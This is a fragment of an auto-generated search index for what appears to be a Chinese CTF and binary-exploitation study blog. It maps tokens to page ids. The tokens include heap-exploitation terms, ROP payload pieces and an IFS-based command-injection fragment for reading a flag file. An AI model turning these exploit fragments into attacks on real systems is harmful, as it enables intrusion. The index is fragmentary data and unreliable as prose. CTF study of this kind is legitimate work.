:{\"55\":1,\"71\":1,\"106\":1,\"109\":12,\"124\":6,\"127\":3,\"137\":1,\"174\":1,\"202\":2}}],[\"when\",{\"1\":{\"195\":1}}],[\"whether\",{\"1\":{\"109\":4}}],[\"while\",{\"1\":{\"64\":1,\"75\":1,\"95\":1,\"104\":1,\"106\":1,\"109\":1,\"124\":1,\"134\":1,\"136\":1,\"138\":1,\"224\":2,\"226\":1,\"227\":1,\"245\":1,\"248\":1}}],[\"which\",{\"1\":{\"55\":1,\"71\":1,\"109\":2,\"134\":1,\"138\":1,\"176\":1,\"213\":1}}],[\"why\",{\"1\":{\"55\":1}}],[\"what\",{\"1\":{\"55\":1}}],[\"www\",{\"1\":{\"36\":1}}],[\"hgame\",{\"0\":{\"304\":1}}],[\"hgameweek2babyre\",{\"0\":{\"242\":1}}],[\"hgame的week3的一道题\",{\"1\":{\"140\":1}}],[\"hilite\",{\"1\":{\"249\":1}}],[\"hi\",{\"1\":{\"189\":1}}],[\"high\",{\"1\":{\"109\":1,\"165\":2,\"287\":2,\"288\":1}}],[\"hitcon\",{\"0\":{\"68\":1}}],[\"huge的分配\",{\"1\":{\"223\":1}}],[\"huge\",{\"1\":{\"223\":3}}],[\"hurt\",{\"1\":{\"109\":1}}],[\"hub我们只需要根据ubuntu的版本\",{\"1\":{\"47\":1}}],[\"h>\",{\"1\":{\"75\":2,\"182\":5,\"189\":2,\"243\":1,\"247\":1,\"255\":1}}],[\"handle\",{\"1\":{\"202\":1}}],[\"handler\",{\"1\":{\"22\":1,\"27\":1,\"244\":1,\"246\":1}}],[\"has\",{\"1\":{\"109\":1}}],[\"have\",{\"1\":{\"71\":1,\"106\":2,\"109\":10,\"124\":8,\"132\":1,\"137\":1,\"138\":1,\"265\":1}}],[\"happend\",{\"1\":{\"64\":2}}],[\"hex\",{\"1\":{\"143\":2,\"144\":2,\"165\":12,\"255\":1,\"258\":2,\"260\":5,\"264\":7,\"266\":1,\"271\":1,\"273\":8,\"276\":4,\"287\":12,\"288\":21,\"290\":1}}],[\"here\",{\"1\":{\"106\":1,\"109\":1,\"127\":1}}],[\"head来实现劫持\",{\"1\":{\"273\":1}}],[\"head来绕过新版本的检查机制\",{\"1\":{\"146\":1}}],[\"head$ifs$1flag\",{\"1\":{\"253\":1}}],[\"head命令\",{\"1\":{\"249\":1}}],[\"head头\",{\"1\":{\"150\":1,\"154\":1}}],[\"header\",{\"0\":{\"150\":1}}],[\"head\",{\"1\":{\"98\":2,\"106\":2,\"109\":2,\"122\":1,\"138\":1,\"249\":4,\"275\":2}}],[\"head即可\",{\"1\":{\"61\":1}}],[\"heapbase\",{\"1\":{\"276\":1}}],[\"heap结构\",{\"1\":{\"223\":1}}],[\"heap是内存池的一个结构\",{\"1\":{\"223\":1}}],[\"heap是仅仅在非主分配区使用的\",{\"1\":{\"138\":1}}],[\"heap相关学习\",{\"0\":{\"223\":1}}],[\"heap+0xba0\",{\"1\":{\"288\":1}}],[\"heap+0xb20+0x10\",{\"1\":{\"288\":1}}],[\"heap+0xf40\",{\"1\":{\"288\":1}}],[\"heap+0x1390\",{\"1\":{\"288\":1}}],[\"heap+0x1398\",{\"1\":{\"288\":1}}],[\"heap+0x42260\",{\"1\":{\"288\":1}}],[\"heap+0x42050+0x10\",{\"1\":{\"288\":1}}],[\"heap+0x42420\",{\"1\":{\"165\":1,\"287\":1}}],[\"heap+0xd10\",{\"1\":{\"276\":1}}],[\"heap+5664\",{\"1\":{\"273\":1}}],[\"heap+5696\",{\"1\":{\"273\":2}}],[\"heap+271376+0x10\",{\"1\":{\"165\":1,\"287\":1}}],[\"heap会因为我们消耗topchunk一次而发生细微的改变\",{\"1\":{\"163\":1,\"285\":1}}],[\"heap>>12^0x404070\",{\"1\":{\"276\":1}}],[\"heap>>12\",{\"1\":{\"163\":1,\"285\":1}}],[\"heap地址\",{\"1\":{\"157\":1,\"279\":1}}],[\"heap可以查看当前的chunk\",{\"1\":{\"82\":1}}],[\"heap\",{\"0\":{\"158\":1,\"280\":1,\"297\":1},\"1\":{\"72\":1,\"80\":1,\"109\":8,\"138\":5,\"158\":1,\"165\":4,\"223\":5,\"224\":15,\"226\":10,\"227\":5,\"273\":10,\"276\":3,\"280\":1,\"287\":4,\"288\":6}}],[\"hence\",{\"1\":{\"71\":1,\"202\":1}}],[\"help\",{\"1\":{\"27\":2,\"249\":1}}],[\"hello\",{\"0\":{\"266\":1},\"1\":{\"21\":1}}],[\"hhh后面找到个类似的解决的文章\",{\"1\":{\"46\":1}}],[\"http\",{\"1\":{\"43\":2,\"46\":7}}],[\"https\",{\"1\":{\"27\":1,\"36\":2,\"48\":1,\"116\":1,\"222\":1}}],[\"html\",{\"1\":{\"36\":1}}],[\"h\",{\"1\":{\"27\":2,\"138\":12,\"154\":1,\"216\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"how\",{\"1\":{\"154\":1}}],[\"however\",{\"1\":{\"127\":1}}],[\"house\",{\"0\":{\"89\":1,\"166\":1,\"169\":1,\"178\":1},\"1\":{\"167\":3,\"178\":1,\"182\":1}}],[\"hook地址写入栈\",{\"0\":{\"262\":1}}],[\"hooking\",{\"1\":{\"30\":3,\"32\":1}}],[\"hook无导出函数\",{\"1\":{\"23\":1}}],[\"hook构造函数\",{\"1\":{\"20\":1}}],[\"hook构造方法\",{\"0\":{\"20\":1}}],[\"hooktest9\",{\"1\":{\"23\":1}}],[\"hooktest6\",{\"1\":{\"22\":1}}],[\"hooktest4\",{\"1\":{\"21\":1}}],[\"hooktest3\",{\"1\":{\"20\":1}}],[\"hooktest2\",{\"1\":{\"19\":1}}],[\"hooktest1\",{\"1\":{\"19\":1}}],[\"hook所有重载函数\",{\"1\":{\"19\":1}}],[\"hook重载方法\",{\"1\":{\"19\":1}}],[\"hook重载函数\",{\"0\":{\"19\":1}}],[\"hookdemo01\",{\"1\":{\"17\":1,\"19\":2,\"20\":1,\"21\":2,\"22\":2}}],[\"hook\",{\"0\":{\"13\":1,\"23\":1,\"27\":1},\"1\":{\"17\":1,\"19\":1,\"23\":2,\"27\":2,\"30\":1,\"259\":1,\"260\":7,\"261\":1,\"264\":7,\"273\":2}}],[\"hook相关\",{\"0\":{\"12\":1}}],[\"homepage\",{\"1\":{\"0\":1}}],[\"home\",{\"0\":{\"0\":1},\"1\":{\"0\":2,\"27\":1,\"254\":1}}],[\"+mprotect+pop\",{\"1\":{\"289\":1}}],[\"+mov\",{\"1\":{\"258\":1}}],[\"+read+p64\",{\"1\":{\"289\":1}}],[\"+read+pop\",{\"1\":{\"288\":1}}],[\"+ret+p64\",{\"1\":{\"258\":1}}],[\"+open64+pop\",{\"1\":{\"288\":1}}],[\"+write\",{\"1\":{\"288\":2}}],[\"+sigreturn\",{\"1\":{\"290\":2}}],[\"+size所占字节数\",{\"1\":{\"74\":1}}],[\"+shellcode\",{\"1\":{\"271\":1}}],[\"+47\",{\"1\":{\"266\":1}}],[\"+40\",{\"1\":{\"77\":1}}],[\"+b\",{\"1\":{\"264\":1,\"267\":1,\"270\":1,\"273\":1,\"288\":1}}],[\"+0x3d1ee\",{\"1\":{\"288\":1}}],[\"+0x50d70\",{\"1\":{\"276\":1}}],[\"+0x522c0\",{\"1\":{\"264\":1}}],[\"+0xe3b2e\",{\"1\":{\"264\":1}}],[\"+0xf\",{\"1\":{\"74\":1,\"75\":1}}],[\"+2238824\",{\"1\":{\"264\":1}}],[\"+2240352+8\",{\"1\":{\"264\":1}}],[\"+2045376+0x28\",{\"1\":{\"264\":1}}],[\"+20\",{\"1\":{\"77\":1}}],[\"+libc\",{\"1\":{\"258\":1}}],[\"+pop\",{\"1\":{\"288\":9,\"289\":4}}],[\"+p32\",{\"1\":{\"256\":1,\"270\":1,\"271\":2}}],[\"+p64\",{\"1\":{\"163\":2,\"165\":6,\"258\":2,\"264\":2,\"266\":1,\"273\":6,\"276\":8,\"285\":2,\"287\":6,\"288\":14}}],[\"++n\",{\"1\":{\"245\":1}}],[\"++j\",{\"1\":{\"244\":1}}],[\"++i\",{\"1\":{\"244\":1,\"246\":1}}],[\"+fakechunk\",{\"1\":{\"162\":4,\"284\":4}}],[\"+fun\",{\"1\":{\"23\":1}}],[\"+1\",{\"1\":{\"143\":2,\"144\":2}}],[\"+12\",{\"1\":{\"77\":1}}],[\"+=asm\",{\"1\":{\"268\":2}}],[\"+=\",{\"1\":{\"109\":3,\"138\":1,\"143\":5,\"144\":5,\"245\":1,\"247\":1,\"268\":5,\"271\":5}}],[\"+glibc\",{\"1\":{\"92\":1}}],[\"+8\",{\"1\":{\"77\":1}}],[\"+\",{\"0\":{\"130\":1},\"1\":{\"23\":1,\"74\":1,\"75\":1,\"77\":8,\"81\":4,\"98\":1,\"109\":1,\"137\":1,\"138\":8,\"143\":1,\"144\":1,\"150\":1,\"152\":1,\"153\":1,\"154\":3,\"182\":16,\"223\":1,\"224\":2,\"226\":1,\"227\":1,\"244\":2,\"245\":3,\"246\":1,\"247\":9,\"260\":2,\"290\":4}}],[\"+this\",{\"1\":{\"21\":2}}],[\"+num\",{\"1\":{\"19\":1}}],[\"在申请large\",{\"1\":{\"276\":1}}],[\"在处理文本时会将这些字符视为字段之间的分隔符\",{\"1\":{\"251\":1}}],[\"在处理多个文件时不打印每个文件的名称作为头部\",{\"1\":{\"249\":1}}],[\"在退出\",{\"1\":{\"249\":1}}],[\"在到达文件末尾时自动退出\",{\"1\":{\"249\":1}}],[\"在搜索时忽略大小写\",{\"1\":{\"249\":1}}],[\"在失败时返回非零错误编号\",{\"1\":{\"243\":1}}],[\"在\",{\"1\":{\"234\":1}}],[\"在rep\",{\"1\":{\"220\":1}}],[\"在以前我的理解就是这是存储的文件数据的一个结构\",{\"1\":{\"185\":1}}],[\"在一个大的chunk中\",{\"1\":{\"150\":1}}],[\"在一开始的时候提过\",{\"1\":{\"104\":1}}],[\"在最后会将arahat0师傅的脚本给出来\",{\"1\":{\"146\":1}}],[\"在写入内容的时候最后加了一个0导致我们没办法读出来\",{\"1\":{\"145\":1}}],[\"在使用的就只有prev\",{\"1\":{\"114\":1}}],[\"在linux中\",{\"1\":{\"112\":1}}],[\"在这里已经将chunk从unsortdbin中移除\",{\"1\":{\"99\":1}}],[\"在delemo的时候是根据emo\",{\"1\":{\"78\":1}}],[\"在addemo的时候name\",{\"1\":{\"78\":1}}],[\"在android\",{\"1\":{\"36\":1}}],[\"在hook函数之后执行\",{\"1\":{\"23\":1}}],[\"在hook函数之前执行\",{\"1\":{\"23\":1}}],[\"在整个搜索流程完成的时候会调用\",{\"1\":{\"21\":1}}],[\"在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了\",{\"1\":{\"19\":1}}],[\"$fruit\",{\"1\":{\"252\":1}}],[\"$line\",{\"1\":{\"252\":1}}],[\"$$`\",{\"1\":{\"248\":1}}],[\"$$\",{\"1\":{\"248\":1}}],[\"$\",{\"1\":{\"230\":1,\"248\":12}}],[\"$2\",{\"1\":{\"193\":1}}],[\"$new\",{\"1\":{\"20\":1}}],[\"$init\",{\"1\":{\"20\":2}}],[\"v4\",{\"1\":{\"255\":4}}],[\"v2\",{\"1\":{\"254\":3}}],[\"v\",{\"1\":{\"249\":1}}],[\"v9\",{\"1\":{\"244\":3}}],[\"v8\",{\"1\":{\"244\":2}}],[\"v7\",{\"1\":{\"244\":2}}],[\"vtables部分内\",{\"1\":{\"213\":1}}],[\"vtables\",{\"1\":{\"213\":5}}],[\"vtable和\",{\"1\":{\"212\":1}}],[\"vtable表赋值\",{\"0\":{\"197\":1}}],[\"vtable指向的是类型为\",{\"1\":{\"184\":1}}],[\"vtable改为\",{\"1\":{\"180\":1}}],[\"vtable\",{\"0\":{\"186\":1,\"213\":1},\"1\":{\"173\":1,\"175\":1,\"179\":2,\"180\":4,\"181\":1,\"182\":5,\"184\":1,\"189\":4,\"193\":4,\"195\":1,\"196\":2,\"211\":2,\"212\":1,\"213\":7}}],[\"vuln\",{\"1\":{\"143\":2,\"144\":2,\"154\":2,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"verbose\",{\"1\":{\"249\":1}}],[\"version\",{\"1\":{\"240\":1}}],[\"very\",{\"1\":{\"137\":1}}],[\"verify\",{\"1\":{\"127\":1}}],[\"ve\",{\"1\":{\"127\":1}}],[\"vim命令\",{\"1\":{\"249\":1}}],[\"vi\",{\"1\":{\"249\":1}}],[\"via\",{\"1\":{\"109\":2,\"138\":1}}],[\"victim所以等价替换\",{\"1\":{\"110\":1}}],[\"victim为last\",{\"1\":{\"98\":1}}],[\"victim\",{\"1\":{\"90\":7,\"91\":2,\"95\":4,\"97\":6,\"98\":5,\"100\":4,\"102\":5,\"103\":3,\"104\":16,\"106\":17,\"107\":2,\"110\":12}}],[\"view函数\",{\"1\":{\"156\":1,\"278\":1}}],[\"view\",{\"1\":{\"39\":2,\"158\":1,\"163\":1,\"273\":3,\"276\":2,\"280\":1,\"285\":1,\"288\":5}}],[\"vctf\",{\"0\":{\"84\":1,\"146\":1}}],[\"vs\",{\"1\":{\"81\":1,\"129\":1,\"130\":1}}],[\"vmmap得到的\",{\"1\":{\"72\":1}}],[\"v1\",{\"1\":{\"43\":1,\"167\":1,\"254\":2}}],[\"vatble\",{\"1\":{\"180\":1,\"182\":3}}],[\"validate\",{\"0\":{\"213\":1},\"1\":{\"179\":2,\"212\":1,\"213\":1}}],[\"valid\",{\"1\":{\"175\":1,\"193\":1}}],[\"val\",{\"1\":{\"109\":1,\"124\":1}}],[\"values\",{\"1\":{\"109\":1}}],[\"value\",{\"1\":{\"21\":2,\"137\":1,\"193\":4,\"244\":1,\"245\":2,\"246\":3,\"247\":5,\"254\":1,\"255\":3,\"288\":3}}],[\"value=999\",{\"1\":{\"21\":2}}],[\"value=\",{\"1\":{\"21\":1}}],[\"vararg\",{\"1\":{\"255\":1}}],[\"var\",{\"1\":{\"17\":2,\"19\":5,\"20\":1,\"21\":1,\"22\":5,\"23\":5,\"27\":3}}],[\"void\",{\"1\":{\"20\":1,\"21\":2,\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"109\":1,\"118\":1,\"124\":1,\"129\":1,\"138\":1,\"174\":2,\"182\":6,\"189\":1,\"195\":1,\"202\":2,\"223\":1,\"224\":3,\"226\":1,\"227\":2,\"243\":6,\"244\":2,\"245\":3,\"247\":4}}],[\"os\",{\"1\":{\"248\":2}}],[\"os=\",{\"1\":{\"154\":2,\"258\":2,\"260\":3,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":1,\"269\":3,\"270\":1,\"271\":2,\"273\":3,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"our\",{\"1\":{\"202\":1}}],[\"outbufend\",{\"1\":{\"193\":2}}],[\"outbuf\",{\"1\":{\"193\":2}}],[\"out\",{\"1\":{\"20\":1,\"21\":1,\"109\":1,\"193\":1}}],[\"owner\",{\"1\":{\"193\":1}}],[\"other\",{\"1\":{\"109\":1}}],[\"otherwise\",{\"1\":{\"109\":1,\"124\":1,\"132\":1}}],[\"old2\",{\"1\":{\"109\":4,\"124\":4}}],[\"old\",{\"1\":{\"109\":9,\"124\":12,\"163\":2,\"193\":1,\"195\":1,\"241\":1,\"285\":2}}],[\"ol4three\",{\"1\":{\"28\":1}}],[\"ok\",{\"1\":{\"109\":1,\"137\":1}}],[\"overflow的调用\",{\"0\":{\"180\":1}}],[\"overflow调用\",{\"0\":{\"179\":1}}],[\"overflow可以知道fp\",{\"1\":{\"173\":1}}],[\"overflow\",{\"0\":{\"172\":1},\"1\":{\"173\":1,\"176\":1,\"179\":2,\"180\":10,\"182\":1,\"186\":2}}],[\"overflow函数\",{\"1\":{\"169\":1,\"172\":1,\"180\":1}}],[\"overall\",{\"1\":{\"71\":1}}],[\"overlap\",{\"1\":{\"79\":1}}],[\"overlength=student\",{\"1\":{\"19\":1}}],[\"overloads\",{\"1\":{\"19\":3}}],[\"overload\",{\"1\":{\"19\":1}}],[\"of\",{\"0\":{\"89\":1,\"166\":1,\"169\":1,\"178\":1},\"1\":{\"71\":1,\"75\":1,\"109\":10,\"124\":5,\"132\":4,\"137\":1,\"154\":2,\"167\":3,\"175\":9,\"178\":1,\"182\":1,\"193\":9,\"202\":1,\"223\":2,\"255\":2}}],[\"off64\",{\"1\":{\"174\":1}}],[\"off\",{\"0\":{\"130\":1},\"1\":{\"23\":1,\"85\":1}}],[\"off=0x7078\",{\"1\":{\"23\":1}}],[\"offset是一个绝对地址\",{\"1\":{\"236\":1}}],[\"offset变为了\",{\"1\":{\"205\":1}}],[\"offset\",{\"1\":{\"23\":1,\"90\":1,\"97\":1,\"98\":1,\"100\":1,\"106\":2,\"109\":9,\"124\":4,\"174\":1,\"193\":3,\"202\":1,\"211\":2,\"213\":2,\"236\":2}}],[\"orw\",{\"1\":{\"290\":1}}],[\"orw+exit\",{\"0\":{\"288\":1}}],[\"org\",{\"1\":{\"92\":1}}],[\"orig\",{\"1\":{\"224\":2,\"226\":2}}],[\"orientation\",{\"1\":{\"195\":3}}],[\"ori\",{\"1\":{\"58\":1}}],[\"or\",{\"1\":{\"46\":2,\"109\":9,\"124\":1,\"137\":1,\"163\":1,\"285\":1}}],[\"op\",{\"1\":{\"154\":2}}],[\"option\",{\"1\":{\"118\":2}}],[\"options\",{\"1\":{\"27\":1,\"249\":4}}],[\"optimization\",{\"1\":{\"92\":1}}],[\"open+read的长度\",{\"1\":{\"290\":1}}],[\"open64\",{\"1\":{\"288\":1}}],[\"open函数\",{\"1\":{\"205\":1}}],[\"open函数来打开\",{\"1\":{\"205\":1}}],[\"open\",{\"1\":{\"43\":2}}],[\"objection基本操作与实战\",{\"1\":{\"28\":1}}],[\"objection\",{\"0\":{\"28\":1},\"1\":{\"28\":1}}],[\"object\",{\"1\":{\"27\":2}}],[\"obj\",{\"1\":{\"21\":4,\"235\":1}}],[\"only\",{\"1\":{\"109\":1,\"124\":1,\"230\":1}}],[\"onleave\",{\"1\":{\"23\":1}}],[\"one漏洞覆写bk\",{\"1\":{\"151\":1}}],[\"one漏洞来实现修改fd\",{\"1\":{\"150\":1}}],[\"one漏洞\",{\"1\":{\"85\":1,\"86\":1,\"265\":1,\"273\":1}}],[\"one\",{\"0\":{\"130\":1,\"272\":1},\"1\":{\"71\":1,\"109\":1,\"146\":1,\"249\":1,\"264\":4}}],[\"onenter\",{\"1\":{\"23\":1}}],[\"on\",{\"1\":{\"27\":1,\"109\":2,\"127\":1,\"132\":2,\"137\":1,\"195\":1}}],[\"oncomplete\",{\"1\":{\"21\":1,\"22\":1,\"27\":1}}],[\"oncompete\",{\"1\":{\"21\":1}}],[\"onmatch\",{\"1\":{\"21\":2,\"22\":1,\"27\":1}}],[\"稍微举列子\",{\"1\":{\"20\":1}}],[\"的合并机制需要\",{\"1\":{\"276\":1}}],[\"的值可以改变\",{\"1\":{\"251\":1}}],[\"的工作原理\",{\"0\":{\"251\":1}}],[\"的前\",{\"1\":{\"249\":2}}],[\"的搜索是区分大小写的\",{\"1\":{\"249\":1}}],[\"的翻译\",{\"1\":{\"237\":1}}],[\"的参数给\",{\"1\":{\"234\":1}}],[\"的内容为\",{\"1\":{\"234\":1}}],[\"的地方\",{\"1\":{\"234\":1}}],[\"的fd不能像修改fd\",{\"1\":{\"152\":1}}],[\"的fd和bk分别指向chunk\",{\"1\":{\"150\":1}}],[\"的位置\",{\"1\":{\"142\":1}}],[\"的时候\",{\"1\":{\"132\":1}}],[\"的时候相当于会自动去调用函数\",{\"1\":{\"20\":1}}],[\"的chunk指针\",{\"1\":{\"276\":1}}],[\"的chunk\",{\"1\":{\"132\":1,\"143\":2,\"144\":2,\"260\":2,\"276\":2,\"288\":2}}],[\"的部分清空\",{\"1\":{\"109\":1}}],[\"的头部指针的值赋给块\",{\"1\":{\"109\":1}}],[\"的链表表头赋值给\",{\"1\":{\"103\":1}}],[\"的指针\",{\"1\":{\"97\":1}}],[\"的下一个chunk\",{\"1\":{\"97\":1}}],[\"的倍数\",{\"1\":{\"74\":1}}],[\"的\",{\"1\":{\"69\":1,\"109\":1}}],[\"的历史记录中删除提交通常是一个坏主意\",{\"1\":{\"58\":1}}],[\"的方式来hook\",{\"1\":{\"17\":1}}],[\"触发exit\",{\"0\":{\"171\":1}}],[\"触发exit函数\",{\"1\":{\"168\":1,\"169\":1,\"180\":1}}],[\"触发double\",{\"1\":{\"165\":1,\"287\":1}}],[\"触发fastbin的合并\",{\"1\":{\"161\":1,\"275\":1,\"283\":1}}],[\"触发fastbin的合并机制\",{\"1\":{\"157\":1,\"279\":1}}],[\"触发chunk6和chunk5合并\",{\"1\":{\"152\":1}}],[\"触发合并\",{\"1\":{\"150\":1,\"154\":1}}],[\"触发unlink漏洞\",{\"1\":{\"79\":1}}],[\"触发其回调函数\",{\"1\":{\"64\":1}}],[\"触发\",{\"1\":{\"20\":1}}],[\"这题利用的一个head\",{\"1\":{\"274\":1}}],[\"这题应该麻烦的是搭建mips环境\",{\"1\":{\"270\":1}}],[\"这题我们拥有两次写入机会\",{\"1\":{\"261\":1}}],[\"这题存在off\",{\"1\":{\"79\":1}}],[\"这特别有用于处理非标准格式的数据\",{\"1\":{\"251\":1}}],[\"这意味着\",{\"1\":{\"251\":1}}],[\"这对于文本解析\",{\"1\":{\"251\":1}}],[\"这是一个简化的示例\",{\"1\":{\"234\":1}}],[\"这是函数的调用约定所以当我们执行完后read函数后\",{\"1\":{\"231\":1}}],[\"这俩个大佬提供了两种思路\",{\"1\":{\"157\":1,\"279\":1}}],[\"这两个就比较重要了\",{\"1\":{\"130\":1}}],[\"这后面的操作往往是先让fwd到指定的位置\",{\"1\":{\"101\":1}}],[\"这样可能不方便观察\",{\"1\":{\"216\":1}}],[\"这样我们可以轻松构造一个double\",{\"1\":{\"275\":1}}],[\"这样我们可以实现uaf\",{\"1\":{\"274\":1}}],[\"这样我们可以构造一个\",{\"1\":{\"150\":1,\"154\":1}}],[\"这样我们只需要调用file\",{\"1\":{\"186\":1}}],[\"这样我们就可以修改b\",{\"1\":{\"273\":1}}],[\"这样我们就可以轻松愉快地劫持vatble了\",{\"1\":{\"180\":1}}],[\"这样我们就可以向content\",{\"1\":{\"160\":1,\"282\":1}}],[\"这样方便我们后面使用off\",{\"1\":{\"150\":1}}],[\"这样chunk3\",{\"1\":{\"150\":1}}],[\"这样fd和bk分别指向chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\",{\"1\":{\"144\":1}}],[\"这样才能切割\",{\"1\":{\"98\":1}}],[\"这样修改victim\",{\"1\":{\"91\":1}}],[\"这样就可以实现栈的移动\",{\"1\":{\"231\":1}}],[\"这样就可以实现循环利用\",{\"1\":{\"139\":1}}],[\"这样就完成了一次函数的劫持\",{\"1\":{\"181\":1}}],[\"这样就完成了脱链操作\",{\"1\":{\"129\":1}}],[\"这样就会调用\",{\"1\":{\"180\":1}}],[\"这样就能随意控制isused和point了\",{\"1\":{\"159\":1,\"281\":1}}],[\"这样就保留了fd\",{\"1\":{\"150\":1}}],[\"这样就阻止了我们跨chunk进行合并\",{\"1\":{\"88\":1}}],[\"这样就不会堵塞了\",{\"1\":{\"64\":1}}],[\"这样在远程服务器的时候就可以利用这个偏移获取libc基地址\",{\"1\":{\"72\":1}}],[\"这种就类似于lua中的协程了\",{\"1\":{\"66\":1}}],[\"这个free\",{\"1\":{\"269\":1}}],[\"这个变量将被填充为新创建线程的线程id\",{\"1\":{\"243\":1}}],[\"这个变量是当前循环到的unsortedbin\",{\"1\":{\"95\":1}}],[\"这个参数\",{\"1\":{\"236\":1}}],[\"这个寄存器是存入的我们下一条执行的指令地址\",{\"1\":{\"231\":1}}],[\"这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域\",{\"1\":{\"267\":1}}],[\"这个指令可以查到当前的窗口的包和目前的class\",{\"1\":{\"29\":1}}],[\"这个指令\",{\"1\":{\"231\":1}}],[\"这个操作\",{\"1\":{\"231\":1}}],[\"这个操作之前的栈结构\",{\"1\":{\"231\":1}}],[\"这个数据主要存着各种函数\",{\"1\":{\"186\":1}}],[\"这个数组到底是怎么存放数据的\",{\"1\":{\"77\":1}}],[\"这个chunk写上我们想要调用的函数\",{\"1\":{\"180\":1}}],[\"这个chunk是以前为了当作跳板的chunk\",{\"1\":{\"163\":1,\"285\":1}}],[\"这个函数必须返回一个\",{\"1\":{\"243\":1}}],[\"这个函数主要是检测了你的vtable是否在合法区域范围之内\",{\"1\":{\"213\":1}}],[\"这个函数存在于\",{\"1\":{\"180\":1}}],[\"这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含\",{\"1\":{\"21\":1}}],[\"这个结构体包含了\",{\"1\":{\"174\":1}}],[\"这个unsortedbin的chunk的大小就会被清空\",{\"1\":{\"143\":1}}],[\"这个构造等于payload的长度\",{\"1\":{\"130\":1}}],[\"这个关系\",{\"1\":{\"95\":1}}],[\"这个是存size的\",{\"1\":{\"77\":1}}],[\"这个key对应的value也是一个callback函数\",{\"1\":{\"21\":1}}],[\"这个key对应的value是一个callback函数\",{\"1\":{\"21\":1}}],[\"这个方法有什么用呢\",{\"1\":{\"20\":1}}],[\"这里随意\",{\"1\":{\"276\":1}}],[\"这里paload偏移32位置\",{\"1\":{\"276\":1}}],[\"这里保留了原本的构思代码\",{\"1\":{\"268\":1}}],[\"这里举列子\",{\"0\":{\"252\":1}}],[\"这里提到ifs作为shell的内置变量\",{\"1\":{\"250\":1}}],[\"这里old\",{\"1\":{\"241\":1}}],[\"这里写了一个大概的源码\",{\"1\":{\"234\":1}}],[\"这里写个小插曲\",{\"1\":{\"230\":1}}],[\"这里相当于\",{\"1\":{\"234\":1}}],[\"这里相当于让前后的chunk连接起来了\",{\"1\":{\"81\":1}}],[\"这里需要注意eip这个寄存器很特殊\",{\"1\":{\"231\":1}}],[\"这里需要特殊说明\",{\"1\":{\"150\":1}}],[\"这里说一下我自己的浅薄理解\",{\"1\":{\"231\":1}}],[\"这里好好学一下栈迁移这个知识点\",{\"1\":{\"229\":1}}],[\"这里ds也就是段基地址寄存器\",{\"1\":{\"219\":1}}],[\"这里用wiki中提供的代码进行调试理解\",{\"1\":{\"216\":1}}],[\"这里上大佬的图\",{\"1\":{\"188\":1}}],[\"这里推荐自己用有符号的libc自己调试几下\",{\"1\":{\"187\":1}}],[\"这里阅读一下io函数的源码\",{\"1\":{\"187\":1}}],[\"这里阅读了大致逻辑后进行总结\",{\"1\":{\"169\":1}}],[\"这里是执行mov\",{\"1\":{\"231\":1}}],[\"这里是0x90000而不是0x9000\",{\"1\":{\"220\":1}}],[\"这里是常量指针\",{\"1\":{\"184\":1}}],[\"这里是去除了不重要的tcache\",{\"1\":{\"90\":1}}],[\"这里贴出\",{\"1\":{\"182\":1}}],[\"这里比较麻烦的就是fakechunk\",{\"1\":{\"159\":1,\"281\":1}}],[\"这里就要简单很多了\",{\"1\":{\"153\":1}}],[\"这里就要复杂一点了\",{\"1\":{\"152\":1}}],[\"这里就是pop\",{\"1\":{\"231\":1}}],[\"这里就是检查bk是否等于tcache\",{\"1\":{\"127\":1}}],[\"这里就是重点了\",{\"1\":{\"104\":1}}],[\"这里出现的arena数量的上限\",{\"1\":{\"137\":1}}],[\"这里主要是学习一下程序在查找libc的时候的顺序\",{\"1\":{\"238\":1}}],[\"这里主要是讲一下原理\",{\"1\":{\"178\":1}}],[\"这里主要是利用先让chunk0的bk\",{\"1\":{\"151\":1}}],[\"这里主要是绕过unlink\",{\"1\":{\"130\":1}}],[\"这里主要是将unsortedbin合并后的\",{\"1\":{\"101\":1}}],[\"这里原文章讲特别好\",{\"1\":{\"115\":1}}],[\"这里应该是设置head的一系列操作\",{\"1\":{\"106\":1}}],[\"这里避免删除chunk\",{\"1\":{\"106\":1}}],[\"这里先粗略写一下原理\",{\"1\":{\"157\":1,\"279\":1}}],[\"这里先简单说一下我们要干什么\",{\"1\":{\"148\":1}}],[\"这里先是入的chunk\",{\"1\":{\"104\":1}}],[\"这里先解释一下什么是构造方法java中类在定义的时候\",{\"1\":{\"20\":1}}],[\"这里把最后的部分\",{\"1\":{\"102\":1}}],[\"这里猜测就是一个最小chunk\",{\"1\":{\"98\":1}}],[\"这里我是这样理解的当我们自己设计一个文件读取管理器\",{\"1\":{\"186\":1}}],[\"这里我理解的是largebin存在两条链\",{\"1\":{\"104\":1}}],[\"这里我简化了部分链\",{\"1\":{\"91\":1}}],[\"这里我们选择打malloc\",{\"1\":{\"273\":1}}],[\"这里我们动调发现value的值在xor第三次的时候就终止了\",{\"1\":{\"246\":1}}],[\"这里我们假设解析后的地址已经由\",{\"1\":{\"234\":1}}],[\"这里我们不对plt和got表内详细内容进行介绍了\",{\"1\":{\"234\":1}}],[\"这里我们理解即可\",{\"1\":{\"185\":1}}],[\"这里我们将记录信息的chunk称之为头chunk\",{\"1\":{\"159\":1,\"281\":1}}],[\"这里我们已经成功构造好了\",{\"1\":{\"150\":1}}],[\"这里我们主要观察next\",{\"1\":{\"132\":1}}],[\"这里我们可以直观看见bck\",{\"1\":{\"91\":1}}],[\"这里我们就得到了偏移\",{\"1\":{\"72\":1}}],[\"这里我们拿到包名字\",{\"1\":{\"26\":1}}],[\"这里多了一条if检查语句\",{\"1\":{\"88\":1}}],[\"这里记录一下为什么常规overlapping会失效\",{\"1\":{\"84\":1}}],[\